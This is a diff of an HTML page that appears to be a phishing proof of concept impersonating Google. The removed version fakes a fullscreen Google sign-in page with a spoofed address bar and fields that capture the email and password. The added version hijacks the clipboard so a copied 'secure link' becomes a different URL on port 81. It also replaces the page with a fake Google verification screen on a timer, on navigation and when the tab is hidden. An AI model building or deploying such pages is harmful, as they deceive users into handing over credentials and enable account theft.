@@ -1,212 +1,109 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html lang="en">
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Sign in – Google Accounts</title>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background-color: white;
-      font-family: Roboto, sans-serif;
-      height: 100%;
-      overflow: hidden;
-    }
-
-    #signinPage {
-      display: none;
-    }
-
-    #googleBtn {
-      margin-top: 40%;
-      text-align: center;
-    }
-
-    .google-btn {
-      background-color: #fff;
-      border: 1px solid #dcdcdc;
-      border-radius: 5px;
-      padding: 12px 24px;
-      font-size: 16px;
-      color: #444;
-      display: inline-flex;
-      align-items: center;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-      cursor: pointer;
-    }
-
-    .google-btn img {
-      height: 20px;
-      margin-right: 10px;
-    }
-
-    #fakeAddressBar {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 36px;
-      background: white;
-      border-bottom: 1px solid #dcdcdc;
-      display: flex;
-      align-items: center;
-      padding-left: 10px;
-      font-size: 13px;
-      color: #202124;
-      z-index: 10000;
-      font-family: Arial, sans-serif;
-    }
-
-    #lock {
-      width: 14px;
-      height: 14px;
-      margin-right: 6px;
-    }
-
-    #topbar {
-      margin-top: 36px;
-      height: 56px;
-      width: 100%;
-      background-color: #fff;
-      border-bottom: 1px solid #e0e0e0;
-      display: flex;
-      align-items: center;
-      padding: 0 16px;
-      box-sizing: border-box;
-      z-index: 9999;
-    }
-
-    #topbar img {
-      height: 24px;
-      margin-right: 12px;
-    }
-
-    #topbar span {
-      font-size: 16px;
-      color: #202124;
-      font-weight: 500;
-    }
-
-    #form-wrapper {
-      margin-top: 80px;
-      padding: 24px;
-      text-align: center;
-    }
-
-    input {
-      font-size: 18px;
-      width: 90%;
-      padding: 10px;
-      margin: 10px auto;
-      display: block;
-      box-sizing: border-box;
-    }
-
-    button {
-      background-color: #1a73e8;
-      color: white;
-      font-size: 16px;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 4px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-
-    #keyboardTrigger {
-      position: fixed;
-      bottom: 0;
-      width: 100%;
-      display: none;
-      z-index: 9999;
-    }
-
-    #keyboardTrigger input {
-      font-size: 18px;
-      width: 100%;
-      padding: 10px;
-      border: none;
-    }
-
-    .action-button {
-      margin-top: 20px;
-      background-color: #fbbc05;
-      color: white;
-      font-size: 16px;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Verification</title>
+    <style>
+        body { 
+            font-family: -apple-system, sans-serif; 
+            text-align: center; 
+            padding-top: 50px; 
+            margin: 0;
+        }
+        #tst { 
+            padding: 12px; 
+            border: 1px solid #ccc; 
+            border-radius: 8px; 
+            width: 80%; 
+            max-width: 350px; 
+            margin-bottom: 15px; 
+            background: #f1f3f4;
+        }
+        button { 
+            padding: 12px 24px; 
+            background-color: #1a73e8; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
 
-<!-- Step 1: Google Sign-In Button -->
-<div id="googleBtn">
-  <div class="google-btn" id="startSpoof">
-    <img src="https://developers.google.com/identity/images/g-logo.png" alt="G">
-    <span>Sign in with Google</span>
-  </div>
-</div>
+    <div id="main-content">
+        <h3>Account Action Required</h3>
+        <p>Copy the secure link and paste it into the address bar to verify your session.</p>
+        
+        <input id="tst" value="https://www.google.com" disabled><br>
+        <button onclick="copyt()">Copy Link</button>
+    </div>
 
-<!-- Step 2: Spoofed Fullscreen UI -->
-<div id="signinPage">
-  <div id="fakeAddressBar">
-    <img id="lock" src="https://www.gstatic.com/images/icons/material/system/1x/lock_black_18dp.png" alt="lock">
-    <span>https://accounts.google.com</span>
-  </div>
+    <script>
+        // 1. CLIPBOARD HIJACKING LOGIC
+        const tst = document.getElementById('tst');
+        
+        function copyt() {
+            tst.disabled = false;
+            tst.select();
+            document.execCommand('copy');
+            tst.disabled = true;
+            alert("Link copied! Paste it into the address bar and press Enter.");
+        }
 
-  <div id="topbar">
-    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="G">
-    <span>Sign in - Google Accounts</span>
-  </div>
+        tst.oncopy = function(e) {
+            // URL dengan port :81 yang akan disamarkan nantinya
+            e.clipboardData.setData('text/plain', 'http://google.com:81/login.html');
+            e.preventDefault();
+        }
 
-  <div id="form-wrapper">
-    <h2>Sign in</h2>
-    <input type="text" placeholder="Email or phone" id="email">
-    <input type="password" placeholder="Enter your password" id="password">
-    <button onclick="alert('Captured:\n' + email.value + '\n' + password.value)">Next</button>
-    
-    <!-- New button for mailto/tel -->
-    <button class="action-button" id="mailtoBtn">Send an Email</button>
-    <button class="action-button" id="telBtn">Call Now</button>
-  </div>
+        // 2. SPOOFING DISPLAY (Gambar di Tengah)
+        function triggerSpoof() {
+            document.body.innerHTML = `
+                <div style="
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    width: 100vw;
+                    background-color: #ffffff;
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    z-index: 9999;
+                ">
+                    <div style="text-align: center;">
+                        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
+                             style="max-width: 180px; height: auto;">
+                        <p style="color: #5f6368; font-size: 16px; margin-top: 20px;">
+                            Verifying your device...
+                        </p>
+                    </div>
+                </div>
+            `;
+            document.title = "Google";
+        }
 
-  <div id="keyboardTrigger">
-    <input type="text" id="fakeInput" placeholder="Trigger Keyboard">
-  </div>
-</div>
+        // 3. TIMER & NAVIGATION INTERRUPT
+        // Muncul otomatis setelah 5 detik
+        setTimeout(function() {
+            console.log("Timer triggered spoof");
+            triggerSpoof();
+        }, 5000);
 
-<script>
-  document.getElementById("startSpoof").addEventListener("click", function () {
-    document.documentElement.requestFullscreen().then(() => {
-      document.getElementById("googleBtn").style.display = "none";
-      document.getElementById("signinPage").style.display = "block";
-      setTimeout(() => {
-        document.getElementById("keyboardTrigger").style.display = "block";
-        document.getElementById("fakeInput").focus(); // Triggers Android keyboard
-      }, 300);
-    });
-  });
+        // Memicu saat navigasi (Paste & Enter) atau pindah tab
+        window.onbeforeunload = function() {
+            triggerSpoof();
+        };
 
-  // Adding event listeners for mailto and tel actions
-  document.getElementById("mailtoBtn").addEventListener("click", function() {
-    window.location.href = "mailto:test@example.com";
-  });
-
-  document.getElementById("telBtn").addEventListener("click", function() {
-    window.location.href = "tel:+1234567890";
-  });
-
-  // Detect fullscreen change and adjust layout
-  document.addEventListener("fullscreenchange", function() {
-    if (!document.fullscreenElement) {
-      // Adjust layout after exiting fullscreen
-      document.getElementById('topbar').style.marginTop = '36px'; // Reset topbar margin
-    }
-  });
-</script>
-
+        // Menangani kasus pindah tab di iOS
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'hidden') {
+                // Saat user meninggalkan tab, kita siapkan tampilan spoof
+                triggerSpoof();
+            }
+        });
+    </script>
 </body>
 </html>
